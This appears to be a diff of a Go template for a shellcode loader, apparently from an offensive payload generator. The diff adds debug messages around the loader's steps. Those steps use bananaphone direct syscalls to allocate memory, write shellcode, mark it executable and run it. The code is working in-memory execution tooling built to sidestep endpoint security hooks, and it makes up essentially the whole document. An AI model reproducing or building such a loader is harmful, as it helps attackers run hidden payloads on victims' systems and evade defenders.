@@ -45,7 +45,9 @@ func run(shellcode []byte) {
 	{{end}}
 
 	regionsize := uintptr(len(shellcode))
-	
+	{{if .Debug}}
+	printDebug("info","Allocate the memory")
+	{{end}}
 	r1, r = bananaphone.Syscall(
 		alloc, //ntallocatevirtualmemory
 		handle,
@@ -61,12 +63,16 @@ func run(shellcode []byte) {
 		{{end}}
 		return
 	}
-
+	{{if .Debug}}
+	printDebug("info","Write data in memory")
+	{{end}}
 	//write memory
 	bananaphone.WriteMemory(shellcode, baseA)
 
 	var oldprotect uintptr
-
+	{{if .Debug}}
+	printDebug("info","Change allocated memory protection to PAGE_EXECUTE_READ")
+	{{end}}
 	r1, r = bananaphone.Syscall(
 		protect, //NtProtectVirtualMemory
 		handle,
@@ -82,6 +88,9 @@ func run(shellcode []byte) {
 		{{end}}
 		return
 	}
+	{{if .Debug}}
+	printDebug("info","Execute the shellcode")
+	{{end}}
 
 	syscall.Syscall(baseA, 0, 0, 0, 0)
 
